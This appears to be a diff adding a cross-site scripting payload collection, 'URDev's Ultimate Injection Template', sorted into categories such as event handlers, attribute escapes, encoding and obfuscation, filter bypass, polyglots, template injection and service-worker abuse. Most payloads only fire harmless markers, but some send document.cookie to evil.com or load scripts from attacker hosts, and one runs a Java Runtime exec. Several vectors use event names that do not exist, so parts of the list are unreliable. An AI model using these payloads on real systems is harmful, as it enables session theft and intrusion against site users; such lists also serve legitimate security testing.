@@ -1,0 +1,887 @@
+         .dkx;
+        .MMMMMK;
+         OMMMMMMK,
+          'OMMMMMMK,
+            'OMMMMMM0,
+              'OMMMMMM0'
+                'OMMMMMM0'
+                  '0MMMMMM0'
+                    ,0MMMMMMO.
+                    .lWMMMMMMk
+                  ,kMMMMMMMNo
+               .lXMMMMMMMk,
+             ;OMMMMMMMXl.
+          .dNMMMMMMWk,
+        :0MMMMMMMXl.
+     .oNMMMMMMMO,      'cccccccccccccccccc'
+    :WMMMMMMNo.       kMMMMMMMMMMMMMMMMMMMMO
+    :MMMMMO,          lWMMMMMMMMMMMMMMMMMMWo
+     .:l;.             'cccccccccccccccccc'
+
+|----------------------------------------------|
+|  URDev's Ultimate Injection Template (v1.0)  |
+|----------------------------------------------|
+
+
+========================
+PRIMITIVE DIRECT SCRIPT INJECTION
+========================
+
+<script>console.log('URDev_1337')</script><script>confirm(document.URL);</script><script>prompt(navigator.userAgent);</script><script>document.write('URDev_XSS')</script><script>history.pushState(1,1,'#URDev')</script><script>print();</script><script>window.name='URDev'</script><script>self['eval']('console.log(1)')</script><script>Function('alert(1)')()</script><script>top['document']['location']='javascript:console.log(1)'</script><script>frames[0]['document']['write']('<img src=x>')</script><script>document.defaultView.console.log('URDev')</script><script>parent.frames[0].location='data:text/html,<script>confirm(1)'</script><script>opener.document.body.innerHTML='<svg onload=console.log(1)>'</script><script>document.rootElement||document.documentElement</script><script>document.implementation.createHTMLDocument('').write('URDev')</script>
+========================
+ALTERNATIVE SCRIPT DELIVERY VECTORS
+========================
+
+<script src=data:,console.log(1337)></script><script src=javascript:confirm(2)></script><script src=//URDev.evil/script.js></script><script>import('data:text/javascript,console.log(1)')</script><script src="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></script><script src="jav ascript:console.log(1)"></script><script src="jav&#x09;ascript:confirm(2)"></script><script src="jav&#x0A;ascript:prompt(3)"></script><script src="jav&#x0D;ascript:print()"></script>
+<scr ipt>console.log(1)</scr ipt>
+<scr
+ipt>confirm(2)</scr
+ipt>
+<scr ipt>prompt(3)</scr ipt>
+
+========================
+HTML ELEMENT EVENT HANDLERS (BASIC)
+========================
+<img src=x onerror=console.log('URDev_IMG')>
+<svg onload=confirm('URDev_SVG')>
+
+<iframe srcdoc="<img src=x onerror=prompt(1)>"></iframe> <video autoplay oncanplay=print()></video> <audio src onerror=history.back()></audio> <marquee onstart=console.log(document.domain)></marquee> <body onload=confirm('URDev_BODY')> <frameset onload=prompt(1)></frameset> <applet code=x onerror=console.log(1)></applet> <embed src=x onerror=confirm(2)> <object data=x onerror=prompt(3)> <isindex action=javascript:console.log(1)> <keygen onchange=confirm(2)> <textarea onfocus=prompt(3)></textarea> <select onblur=console.log(1)></select> <button onclick=confirm(2)>URDev</button> <label onmouseover=prompt(3)>Hover</label> <legend onmouseout=console.log(1)>Out</legend> <fieldset oncontextmenu=confirm(2)>RightClick</fieldset>
+========================
+HTML ELEMENT EVENT HANDLERS (ADVANCED)
+========================
+
+<div onmouseenter=console.log('URDev_ENTER')>A</div> <button ondblclick=confirm('URDev_DBL')>B</button> <select onchange=prompt(this.value)><option>URDev</option></select> <form onsubmit=print()><input></form> <details ontoggle=console.log('URDev_TOGGLE') open></details> <dialog onclose=confirm('URDev_CLOSE') open>X</dialog> <menu onshow=prompt(1)></menu> <meter oninput=console.log(this.value)></meter> <output onforminput=confirm(2)></output> <progress onloadstart=prompt(3)></progress> <ruby onbeforeprint=console.log(1)></ruby> <summary onactivate=confirm(2)></summary> <time onbeforeunload=prompt(3)></time> <wbr ononline=console.log('online')></wbr> <xmp onoffline=confirm('offline')></xmp>
+========================
+ATTRIBUTE CONTEXT ESCAPE PATTERNS
+========================
+"><svg onload=console.log('URDev_1')>
+'><img src=x onerror=confirm('URDev_2')>
+" autofocus onfocus=prompt('URDev_3') x="
+' style=x:expression(print('URDev_4')) '
+"><iframe srcdoc="<script>confirm(5)</script>">
+'><video><source onerror=console.log(6)></video>
+" contenteditable onblur=confirm(7) x="
+' onscroll=prompt(8) style="height:1000px;overflow:scroll" '
+"><math><mtext onmouseover=console.log(9)>+</mtext></math>
+'><marquee loop=1 onstart=confirm(10)></marquee>
+" oncut=prompt(11) x="
+' onpaste=console.log(12) contenteditable '
+"><audio src=x onended=confirm(13)></audio>
+'><track default oncuechange=prompt(14)></track>
+
+========================
+JAVASCRIPT PROTOCOL HANDLERS
+========================
+<a href="javascript:console.log('URDev_Link')">URDev</a>
+<area href=javascript:confirm('URDev_Area') shape=rect>
+
+<form action=javascript:prompt('URDev_Form')><input type=submit></form> <iframe src=javascript:print()></iframe> <frame src=javascript:console.log('URDev_Frame')></frame> <embed src=javascript:confirm(2)> <object data=javascript:prompt(3)></object> <applet codebase=javascript:print()></applet> <base href="javascript:console.log('URDev_Base')//"> <meta http-equiv=refresh content="0;javascript:confirm(2)"> <link href=javascript:prompt(3) rel=stylesheet> <input type=image src=javascript:print()> <button formaction=javascript:console.log(1)>URDev</button> <isindex action=javascript:confirm(2)> <math href=javascript:prompt(3) xmlns="http://www.w3.org/1998/Math/MathML"></math>
+========================
+DATA URI VECTORS (COMPREHENSIVE)
+========================
+
+<iframe src="data:text/html,<svg onload=print()>"></iframe> <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='console.log(1)'>"> <object data="data:text/html,<script>confirm(1)</script>"></object> <embed src="data:text/html,<marquee onstart=prompt(2)></marquee>"> <applet code="data:text/html,<script>print()</script>"></applet> <video src="data:video/mp4,<script>console.log(1)</script>"></video> <audio src="data:audio/wav,<script>confirm(2)</script>"></audio> <source src="data:text/html,<script>prompt(3)</script>"> <track src="data:text/vtt,<script>print()</script>"> <svg><image href="data:image/svg+xml,<svg onload=console.log(1)>"/></svg> <script src="data:text/javascript,confirm(2)"></script> <link rel=stylesheet href="data:text/css,body{background:red}"> <frame src="data:text/html,<body onload=prompt(3)></body>"></frame> <portal src="data:text/html,<script>console.log(1)</script>"></portal>
+========================
+ENCODING / OBFUSCATION TECHNIQUES
+========================
+
+<script>eval('\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67(\x31\x33\x33\x37)')</script><img src=x onerror=&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;> <svg onload=&#112;&#114;&#105;&#110;&#116;&#40;&#41;> <script>eval('\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x27\x55\x52\x44\x65\x76\x27\x29')</script> <img src=x onerror=String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,49,41)> <svg onload=window['\x63\x6f\x6e\x66\x69\x72\x6d']('\x55\x52\x44\x65\x76')> <script>location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x63\x6F\x6E\x73\x6F\x6C\x65\x2E\x6C\x6F\x67\x28\x31\x29'</script> <img src=x onerror=eval(atob('Y29uc29sZS5sb2coMTMzNyk='))> <svg onload=Function('co'+'nfirm'+'(1)')()> <script>new Function('a','l','e','r','t')('URDev')()</script>
+========================
+DOM-BASED EXECUTION SINKS
+========================
+
+<script>location.hash&&document.write(location.hash.substring(1))</script><script>document.body.innerHTML=location.search.slice(1)</script><script>setTimeout(location.hash.substr(1))</script><script>eval(document.URL.split('#')[1])</script><script>document.write(decodeURIComponent(location.search))</script><script>document.body.outerHTML=location.hash</script><script>document.title=location.search;onpropertychange=console.log</script><script>document.domain=location.hash;onerror=confirm</script><script>document.referrer&&eval(document.referrer)</script><script>name&&eval(name)</script><script>document.cookie&&alert(document.cookie)</script><script>localStorage.x&&document.write(localStorage.x)</script><script>sessionStorage.y&&eval(sessionStorage.y)</script><script>history.state&&Function(history.state)()</script>
+========================
+CSS-BASED EXECUTION VECTORS
+========================
+
+<div style="background-image:url(javascript:console.log('URDev_CSS'))"></div> <style>@import 'javascript:confirm(2)';</style> <div style="width:expression(prompt('URDev_EXPR'))"></div> <link rel=stylesheet href=javascript:console.log(1)> <style>body{background:url(javascript:confirm(2))}</style> <div style="list-style-image:url(javascript:prompt(3))"></div> <style>@font-face{src:url(javascript:print());font-family:URDev}</style> <div style="behavior:url(data:text/plain,alert(1))"></div> <style>input[value^=a]{background:url(javascript:console.log(1))}</style> <div style="-o-link:url(javascript:confirm(2))"></div> <div style="-o-link-source:url(javascript:prompt(3))"></div> <style>selector{background:url('javascript:print()')}</style> <div style="cursor:url(javascript:console.log(1)),auto"></div> <style>@keyframes x{from{background:url(javascript:confirm(2))}}</style> <div style="animation-name:url(javascript:prompt(3))"></div>
+========================
+SVG ADVANCED FEATURES & EVENTS
+========================
+<svg><animate onbegin=console.log('URDev_1') attributeName=x></animate></svg>
+<svg><set onbegin=confirm('URDev_2') attributeName=x></set></svg>
+<svg><foreignObject onload=prompt('URDev_3')></foreignObject></svg>
+<svg><script>confirm(4)</script></svg>
+<svg><a xlink:href="javascript:console.log(5)"><text>URDev</text></a></svg>
+<svg><image onerror=confirm(6) xlink:href=x></image></svg>
+<svg><use onload=prompt(7) xlink:href="#x"></use></svg>
+<svg><animateTransform onbegin=print() attributeName=transform></animateTransform></svg>
+<svg><discard onbegin=console.log(8)></discard></svg>
+<svg><handler onload=confirm(9)></handler></svg>
+<svg><listener onload=prompt(10)></listener></svg>
+<svg><script href="data:text/javascript,print()"/></svg>
+<svg><foreignObject><body onload=console.log(11)></body></foreignObject></svg>
+<svg onload=confirm(12) xmlns="http://www.w3.org/2000/svg"></svg>
+<svg><animate onrepeat=prompt(13) repeatCount=2></animate></svg>
+
+========================
+XML / XHTML / NAMESPACE VECTORS
+========================
+
+<![CDATA[<script>console.log('URDev_CDATA')</script>]]>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">confirm('URDev_XHTML')</x:script>
+
+<html xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=prompt(3) /></html> <svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:console.log(1)">URDev</a></svg> <math xmlns="http://www.w3.org/1998/Math/MathML"><maction actiontype="statusline" onmouseover="confirm(2)"><mtext>X</mtext></maction></math> <xhtml:div xmlns:xhtml="http://www.w3.org/1999/xhtml" onmouseenter="prompt(3)">URDev</xhtml:div> <xml:script xmlns:xml="http://www.w3.org/XML/1998/namespace">print()</xml:script> <xsl:script xmlns:xsl="http://www.w3.org/1999/XSL/Transform">console.log(1)</xsl:script> <fo:script xmlns:fo="http://www.w3.org/1999/XSL/Format">confirm(2)</fo:script>
+========================
+TEMPLATE ENGINE & EXPRESSION INJECTION
+========================
+{{7*'7'}} => 49
+${7*7} => 49
+${{this.constructor.constructor('print()')()}}
+<%= console.log('URDev_ERB') %>
+#{request['x']}
+{{constructor.constructor('confirm(1)')()}}
+{{#with "x" as |y|}}{{y}}{{/with}}
+{{!ignore}}<script>prompt(2)</script>
+[[${7*7}]]
+${T(java.lang.Runtime).getRuntime().exec('calc')}
+{{=console.log(1)}}
+{{console.log(2)}}
+{$console.log(3)}
+@console.log(4)
+#{console.log(5)}
+
+========================
+MARKUP PARSING CONFUSION & FILTER BYPASS
+========================
+<<script>confirm('URDev_1')//</script>
+<scr<script>ipt>print()</scr<script>ipt>
+</textarea><svg onload=console.log('URDev_2')>
+<scr\0ipt>confirm(3)</scr\0ipt>
+<scr\x00ipt>prompt(4)</scr\x00ipt>
+<scr\u0000ipt>console.log(5)</scr\u0000ipt>
+<scr\bript>confirm(6)</scr\bript>
+<scr\tipt>prompt(7)</scr\tipt>
+<scr\nipt>print()</scr\nipt>
+<scr\ript>console.log(8)</scr\ript>
+<scr/ipt>confirm(9)</scr/ipt>
+<scr%00ipt>prompt(10)</scr%00ipt>
+<scr%0Bipt>console.log(11)</scr%0Bipt>
+<scr%0Cipt>confirm(12)</scr%0Cipt>
+<scr%0Eipt>prompt(13)</scr%0Eipt>
+<scr%0Fipt>print()</scr%0Fipt>
+
+========================
+JSON / STRUCTURED INPUT CONTEXTS
+========================
+{"x":"</script><svg onload=confirm('URDev_1')>"}
+{"a":"" onfocus=prompt('URDev_2') autofocus ""}
+{"b":"<img src=x onerror=print()>"}
+["<script>console.log(1)</script>"]
+{"proto":{"toString":()=>{confirm(2)}}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+{"data":"javascript:prompt(3)"}
+{"url":"data:text/html,<script>confirm(4)</script>"}
+{"html":"<iframe srcdoc='<img src=x onerror=console.log(5)>'>"}
+{"css":"background:url(javascript:print())"}
+{"text":"<math><mtext onmouseover=confirm(6)>+</mtext></math>"}
+{"value":"<marquee onstart=prompt(7)></marquee>"}
+{"content":"<audio src=x onended=console.log(8)></audio>"}
+{"title":"<video ontimeupdate=confirm(9)></video>"}
+
+========================
+MEDIA ELEMENT & METADATA EXPLOITS
+========================
+<video poster=x onerror=console.log('URDev_VIDEO')></video>
+
+<track src=x onerror=confirm('URDev_TRACK')> <source src=x onerror=prompt('URDev_SOURCE')> <audio preload=auto onloadeddata=print()></audio> <video onvolumechange=console.log(1)></video> <audio oncanplaythrough=confirm(2)></audio> <source onerror=prompt(3) srcset=x> <picture><source srcset=x onerror=console.log(4)><img></picture> <video onenterpictureinpicture=confirm(5)></video> <audio onratechange=prompt(6)></audio> <video onleavepictureinpicture=print()></video> <track oncuechange=console.log(7) default> <source media="(min-width:0px)" onerror=confirm(8) src=x> <video onresize=prompt(9)></video> <audio onsuspend=console.log(10)></audio>
+========================
+BROWSER API & FEATURE ABUSE
+========================
+
+<script>Notification.requestPermission().then(()=>console.log('URDev'))</script><script>navigator.clipboard.readText().then(t=>eval(t))</script><script>open('about:blank').document.write('<script>confirm(1)')</script><script>navigator.geolocation.getCurrentPosition(()=>prompt(2))</script><script>navigator.mediaDevices.getUserMedia({audio:true}).then(()=>print())</script><script>navigator.vibrate(200);confirm(3)</script><script>navigator.share({title:'URDev'}).then(()=>console.log(4))</script><script>caches.open('x').then(()=>prompt(5))</script><script>indexedDB.open('x').onsuccess=()=>confirm(6)</script><script>performance.mark('x');onresourcetimingbufferfull=()=>console.log(7)</script><script>navigator.credentials.get({password:true}).then(()=>prompt(8))</script><script>navigator.wakeLock.request('screen').then(()=>confirm(9))</script><script>navigator.hid.requestDevice({filters:[]}).then(()=>print())</script><script>navigator.usb.requestDevice({filters:[]}).then(()=>console.log(10))</script>
+========================
+RARE & LEGACY EXECUTION SURFACES
+========================
+<object type="text/html" data="javascript:print()"></object>
+<embed src="javascript:console.log('URDev_EMBED')">
+<math><mtext onmouseover=confirm('URDev_MATHML')>+</mtext></math>
+<applet code="x" archive="javascript:prompt(3)"></applet>
+<isindex prompt="URDev" action=javascript:console.log(4)>
+<keygen onkeygen=confirm(5)>
+<blink ononline=prompt(6)>URDev</blink>
+<listing onafterprint=console.log(7)>X</listing>
+<nextid onpagehide=confirm(8)>
+<multicol onpageshow=prompt(9)>
+<bgsound onplaying=print()>
+<ilayer onreadystatechange=console.log(10)>
+<layer onrowenter=confirm(11)>
+<comment onscroll=prompt(12)></comment>
+<xml:namespace onstorage=console.log(13) prefix="o"/>
+
+========================
+POLYGLOT MULTI-CONTEXT PAYLOADS
+========================
+"><!--</style></script><svg onload=console.log('URDev_1')>-->
+'></title></textarea><img src=x onerror=confirm('URDev_2')>
+javascript:"/*'/*`/*--></styles></script><svg onload=prompt(3)>-->
+"><img src=x onerror=console.log(4)><svg onload=confirm(5)>
+'><script>print()</script><style onload=prompt(6)>
+"/></script></style><marquee onstart=console.log(7)>
+'><!--</title><iframe srcdoc="<img src=x onerror=confirm(8)>">
+"><base href=javascript:prompt(9)//><a href=x>click</a>
+'><template shadowrootmode=open><svg onload=print()></svg>
+"><form><button formaction=javascript:console.log(10)>x</button>
+'><object><param name=movie value=javascript:confirm(11)></object>
+"><embed src=javascript:prompt(12)><noscript><style onload=console.log(13)>
+
+========================
+WEB COMPONENTS & CUSTOM ELEMENTS
+========================
+<xss-element onactivate=console.log('URDev_CUSTOM')></xss-element>
+<custom-tag tabindex=0 onfocus=confirm('URDev_FOCUS')></custom-tag>
+<template shadowrootmode=open><svg onload=prompt('URDev_SHADOW')></svg></template>
+<my-element onmyevent=print()></my-element>
+<element-definition onattached=console.log(1)></element-definition>
+<web-component onconnected=confirm(2)></web-component>
+<shadow-host onslotchange=prompt(3)></shadow-host>
+<custom-element onadopted=print()></custom-element>
+<template id=t><script>console.log(4)</script></template>
+
+<script>customElements.define('x-urdev', class extends HTMLElement{connectedCallback(){confirm(5)}});</script>
+<x-urdev></x-urdev>
+<template shadowroot="open"><style onload=prompt(6)></style></template>
+<slot onslotchange=console.log(7)></slot>
+<part onpartmatch=confirm(8)></part>
+
+========================
+SHADOW DOM & SLOT MANIPULATION
+========================
+
+<div id=host></div> <script> host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=console.log("URDev_SHADOW")>' </script> <template shadowrootmode=open><div onmouseover=confirm(2)></div></template> <shadow-root><script>prompt(3)</script></shadow-root> <div><template shadowroot=open><style onload=print()></style></template></div> <slot name=x onslotchange=console.log(4)></slot> <shadow onslotchange=confirm(5)></shadow> <div><slot><svg onload=prompt(6)></svg></slot></div> <script> Element.prototype.attachShadow({mode:'open'}).innerHTML='<script>console.log(7)' </script> <template id=t><div onclick=confirm(8)>URDev</div></template> <script>document.body.attachShadow({mode:'open'}).append(t.content.cloneNode(true))</script>
+========================
+IFRAME SANDBOX ESCAPE VECTORS
+========================
+
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>console.log('URDev_SANDBOX')</script>"></iframe> <iframe sandbox="allow-forms" srcdoc="<form action=javascript:confirm(2)><input type=submit></form>"></iframe> <iframe sandbox="allow-modals" srcdoc="<script>prompt(3)</script>"></iframe> <iframe sandbox="allow-popups" srcdoc="<script>open('javascript:print()')</script>"></iframe> <iframe sandbox="allow-pointer-lock" srcdoc="<script>console.log(4)</script>"></iframe> <iframe sandbox="allow-orientation-lock" srcdoc="<img src=x onerror=confirm(5)>"></iframe> <iframe sandbox="allow-presentation" srcdoc="<svg onload=prompt(6)></svg>"></iframe> <iframe sandbox="allow-top-navigation" srcdoc="<script>top.location='javascript:console.log(7)'</script>"></iframe> <iframe sandbox="allow-top-navigation-by-user-activation" srcdoc="<button onclick=confirm(8)>URDev</button>"></iframe> <iframe sandbox="allow-downloads" srcdoc="<a href=javascript:prompt(9) download>X</a>"></iframe> <iframe sandbox="allow-storage-access-by-user-activation" srcdoc="<script>print()</script>"></iframe> <iframe sandbox="allow-popups-to-escape-sandbox" srcdoc="<script>console.log(10)</script>"></iframe> <iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<meta http-equiv=refresh content='0;javascript:confirm(11)'>"></iframe>
+========================
+META TAG & REFRESH VECTORS
+========================
+<meta http-equiv=refresh content="0;javascript:console.log('URDev_META')">
+<meta http-equiv=refresh content="0;url=data:text/html,<script>confirm(2)</script>">
+<meta http-equiv=refresh content="3;url=javascript:prompt(3)">
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AE&AHQ&ACMA&ACYADs&ACYAIgAJADsA">
+<meta http-equiv=set-cookie content="x=<script>print()</script>">
+<meta http-equiv=content-security-policy content="script-src 'unsafe-inline'">
+<meta http-equiv=default-style content='x'><style id=x>@import 'javascript:console.log(4)'</style>
+<meta http-equiv=refresh content='0; http://evil.com?c='+document.cookie>
+<meta name=referrer content=unsafe-url>
+<meta http-equiv=refresh content='0;window.location=javascript:confirm(5)'>
+<meta http-equiv=x-ua-compatible content="IE=EmulateIE8"><script>console.log(6)</script>
+<meta http-equiv=refresh content='0;vbscript:MsgBox("URDev")'>
+<meta http-equiv=refresh content='0;url=//evil.com/steal.html?'+btoa(document.cookie)>
+
+========================
+BASE TAG MANIPULATION ATTACKS
+========================
+
+<base href="javascript:console.log('URDev_BASE')//"> <a href="anything">trigger</a> <base href="data:text/html,<script>confirm(2)</script>"> <base href="//evil.com/"> <base href="javascript:prompt(3)//" target="_blank"> <base href="file:///etc/passwd"> <base href="\\evil.com\share"> <base href="http://localhost:3000"> <base href="gopher://evil.com:70/_GET"> <base href="view-source:javascript:print()"> <base href="jar:http://example.com/plugin.jar!/"> <base href="blob:https://example.com/uuid"> <base href="ms-help://"> <base href="mhtml:http://evil.com/payload.mht!x.html">
+========================
+LINK REL ATTRIBUTE ABUSE
+========================
+
+<link rel=stylesheet href=javascript:console.log('URDev_LINK')> <link rel=preload as=script href=javascript:confirm('URDev_PRELOAD')> <link rel=prefetch href=javascript:prompt(3)> <link rel=preconnect href=javascript:print()> <link rel=dns-prefetch href=javascript:console.log(4)> <link rel=prerender href=javascript:confirm(5)> <link rel=modulepreload href=javascript:prompt(6)> <link rel=icon href=javascript:print()> <link rel=manifest href=javascript:console.log(7)> <link rel=alternate href=javascript:confirm(8)> <link rel=author href=javascript:prompt(9)> <link rel=canonical href=javascript:print()> <link rel=license href=javascript:console.log(10)> <link rel=shortlink href=javascript:confirm(11)>
+========================
+FORM & INPUT TYPE EXPLOITS
+========================
+<input type=image src=x onerror=console.log('URDev_IMAGE')>
+<input type=range oninput=confirm('URDev_RANGE')>
+<input type=color oninput=prompt(this.value)>
+<input type=file onchange=print()>
+<input type=date onchange=console.log(this.value)>
+<input type=datetime-local oninput=confirm(2)>
+<input type=email oninvalid=prompt(3) pattern=^$ required>
+<input type=number oninput=print()>
+<input type=search onsearch=console.log(4)>
+<input type=tel oninvalid=confirm(5) pattern=^$ required>
+<input type=time onchange=prompt(6)>
+<input type=url oninvalid=print() pattern=^$ required>
+<input type=week onchange=console.log(7)>
+<input type=month oninput=confirm(8)>
+<input type=hidden value=x onfocus=prompt(9) autofocus>
+<input type=password onfocusin=print()>
+<input type=text onfocusout=console.log(10)>
+
+========================
+DRAG & DROP EVENT EXPLOITS
+========================
+
+<div draggable=true ondragstart=console.log('URDev_DRAG')>drag me</div> <div ondrop=confirm('URDev_DROP') ondragover=event.preventDefault()>drop here</div> <div ondrag=prompt(3)>dragging</div> <div ondragend=print()>drag end</div> <div ondragenter=console.log(4)>enter</div> <div ondragleave=confirm(5)>leave</div> <div ondragover=prompt(6)>over</div> <div ondragstart=print()>start</div> <div ondrop=console.log(7)>drop</div> <div ondragstart=confirm(8) draggable=true style="width:100px;height:100px;background:red"></div> <div ondrop=prompt(9) style="width:100px;height:100px;background:blue"></div> <div ondragover=print() style="width:100px;height:100px;background:green"></div>
+========================
+POINTER & TOUCH EVENT VECTORS
+========================
+
+<div onpointerenter=console.log('URDev_POINTER')>pointer enter</div> <div ontouchstart=confirm('URDev_TOUCH')>touch start</div> <div onpointerdown=prompt(3)>pointer down</div> <div ontouchend=print()>touch end</div> <div onpointermove=console.log(4)>pointer move</div> <div ontouchmove=confirm(5)>touch move</div> <div onpointerup=prompt(6)>pointer up</div> <div ontouchcancel=print()>touch cancel</div> <div onpointerover=console.log(7)>pointer over</div> <div onpointerout=confirm(8)>pointer out</div> <div onpointerleave=prompt(9)>pointer leave</div> <div onpointercancel=print()>pointer cancel</div> <div ongotpointercapture=console.log(10)>got capture</div> <div onlostpointercapture=confirm(11)>lost capture</div>
+========================
+CLIPBOARD EVENT EXPLOITS
+========================
+<input oncopy=console.log('URDev_COPY') value="copy this">
+<input onpaste=confirm('URDev_PASTE')>
+<input oncut=prompt(3) value="cut this">
+
+<div contenteditable oncopy=print()>copy from here</div> <textarea onpaste=console.log(4)>paste here</textarea> <input oncopy=confirm(5) oncut=prompt(6) onpaste=print() value="URDev"> <div onbeforecopy=console.log(7)>before copy</div> <div onbeforecut=confirm(8)>before cut</div> <div onbeforepaste=prompt(9)>before paste</div> <div contenteditable oncopy=print() onpaste=console.log(10) oncut=confirm(11)>edit</div> <textarea oncopy=prompt(12) oncut=print() onpaste=console.log(13)>text</textarea>
+========================
+KEYBOARD EVENT VECTORS
+========================
+<input onkeydown=console.log(event.key)> press a key
+<input onkeyup=confirm('URDev_KEYUP')>
+<input onkeypress=prompt(3)>
+<input oninput=print()>
+<input onchange=console.log(4)>
+
+<div contenteditable onkeydown=confirm(5)>type here</div> <textarea onkeyup=prompt(6)>type</textarea> <input onkeydown=print() onkeyup=console.log(7) onkeypress=confirm(8)> <div onkeydown=prompt(9) tabindex=0>focus and type</div> <textarea oninput=print()>input</textarea> <input onkeydown=console.log(10) onkeyup=confirm(11) onkeypress=prompt(12) oninput=print()>
+========================
+FOCUS MANAGEMENT EXPLOITS
+========================
+<input tabindex=1 onfocusin=console.log('URDev_FOCUSIN')>
+<input tabindex=2 onfocusout=confirm('URDev_FOCUSOUT')>
+<input onfocus=prompt(3) autofocus>
+<input onblur=print()>
+
+<div contenteditable onfocus=console.log(4) tabindex=0>focus</div> <textarea onblur=confirm(5)>blur</textarea> <select onfocus=prompt(6)><option>X</option></select> <button onfocus=print()>button</button> <a href=# onfocus=console.log(7)>link</a> <div tabindex=0 onfocus=confirm(8) onblur=prompt(9)>toggle</div> <input onfocusin=print() onfocusout=console.log(10)> <iframe onfocus=confirm(11)></iframe> <object onfocus=prompt(12)></object>
+========================
+WINDOW & DOCUMENT EVENT HANDLERS
+========================
+
+<body onpageshow=console.log('URDev_PAGESHOW')> <body onpagehide=confirm('URDev_PAGEHIDE')> <body onresize=prompt(innerWidth)> <body onload=print()> <body onunload=console.log(1)> <body onbeforeunload=confirm(2)> <body ononline=prompt(3)> <body onoffline=print()> <body onpopstate=console.log(4)> <body onhashchange=confirm(5)> <body onstorage=prompt(6)> <body onmessage=print()> <body onerror=console.log(7)> <body onscroll=confirm(8)> <body onwheel=prompt(9)> <body onorientationchange=print()> <body ondevicemotion=console.log(10)> <body ondeviceorientation=confirm(11)>
+========================
+HISTORY API MANIPULATION
+========================
+
+<script>onpopstate=()=>console.log('URDev_POPSTATE');history.pushState(1,1,'#x')</script><script>history.replaceState(null,null,'javascript:confirm(2)')</script><script>history.pushState({},'','data:text/html,<script>prompt(3)')</script><script>onpopstate=e=>eval(e.state);history.pushState('console.log(4)','')</script><script>history.pushState('print()','');onpopstate=e=>eval(e.state)</script><script>history.replaceState('confirm(5)','');location.hash='#trigger'</script><script>history.pushState({x:'<img src=x onerror=console.log(6)>'},'')</script><script>onpopstate=()=>document.write(history.state.x)</script>
+========================
+POSTMESSAGE EXPLOITATION FLOWS
+========================
+
+<script>onmessage=e=>console.log(e.data)</script><iframe srcdoc="<script>parent.postMessage('URDev','*')</script>"></iframe> <script>addEventListener('message',e=>eval(e.data))</script> <iframe sandbox="allow-scripts" srcdoc="<script>top.postMessage('confirm(2)','*')</script>"></iframe> <script>onmessage=e=>window[e.data]()</script> <iframe srcdoc="<script>opener.postMessage('print','*')</script>"></iframe> <script>window.open('javascript:onmessage=e=>eval(e.data);','x')</script> <iframe srcdoc="<script>parent.postMessage('<script>console.log(3)','*')</script>"></iframe> <script>addEventListener('message',e=>document.write(e.data))</script> <iframe srcdoc="<script>parent.postMessage('<img src=x onerror=confirm(4)>','*')</script>"></iframe>
+========================
+SERVICE WORKER EXPLOITATION
+========================
+
+<script>navigator.serviceWorker.register('javascript:console.log("URDev_SW")')</script><script>navigator.serviceWorker.register('data:text/javascript,confirm(2)')</script><script>navigator.serviceWorker.register('blob:https://example.com/uuid')</script><script>new Blob(['confirm(3)'],{type:'text/javascript'}).then(b=>navigator.serviceWorker.register(URL.createObjectURL(b)))</script><script>navigator.serviceWorker.controller.postMessage('print()')</script><script>onmessage=e=>navigator.serviceWorker.controller.postMessage(e.data)</script><script>navigator.serviceWorker.register('//evil.com/sw.js')</script><script>navigator.serviceWorker.ready.then(r=>r.active.postMessage('console.log(4)'))</script>
+========================
+WEB STORAGE & CACHE EXPLOITS
+========================
+
+<script>localStorage.x='<img src=x onerror=console.log("URDev_LS")>'</script><script>document.write(localStorage.x)</script><script>sessionStorage.y='<svg onload=confirm(2)>'</script><script>eval(sessionStorage.y)</script><script>localStorage.setItem('z','prompt(3)')</script><script>eval(localStorage.getItem('z'))</script><script>caches.open('x').then(c=>c.put('/x',new Response('<script>print()')))</script><script>indexedDB.open('db').onsuccess=function(e){e.target.result.createObjectStore('x')}</script><script>CookieStore.set({name:'x',value:'<script>console.log(4)'})</script><script>document.cookie='x=<img src=x onerror=confirm(5)>'</script><script>eval(document.cookie.split('=')[1])</script>
+========================
+WEBASSEMBLY LOADING SURFACES
+========================
+
+<script>WebAssembly.compileStreaming(fetch('javascript:confirm("URDev_WASM")'))</script><script>WebAssembly.instantiateStreaming(fetch('data:application/wasm,<script>prompt(2)'))</script><script>new WebAssembly.Module(new ArrayBuffer(8))</script><script>WebAssembly.compile(new ArrayBuffer(8)).then(m=>console.log(m))</script><script>WebAssembly.instantiate(new ArrayBuffer(8)).then(i=>print())</script><script>fetch('javascript:console.log(3)').then(r=>WebAssembly.compileStreaming(r))</script><script>WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0]))</script><script>new WebAssembly.Instance(new WebAssembly.Module(new ArrayBuffer(8)))</script>
+========================
+MATHML RARE EVENT SURFACES
+========================
+<math><maction actiontype=toggle onmouseover=console.log('URDev_MATHML')><mtext>x</mtext></maction></math>
+<math><maction actiontype=statusline onclick=confirm(2)><mtext>y</mtext></maction></math>
+<math><maction actiontype=tooltip onmouseout=prompt(3)><mtext>z</mtext></maction></math>
+<math><maligngroup onalign=print()></maligngroup></math>
+<math><malignmark onalign=console.log(4)></malignmark></math>
+<math><math onresize=confirm(5)></math></math>
+<math><merror onresize=prompt(6)></merror></math>
+<math><mfenced onopen=print()></mfenced></math>
+<math><mfrac ondenomalign=console.log(7)></mfrac></math>
+<math><mi onmathsize=confirm(8)></mi></math>
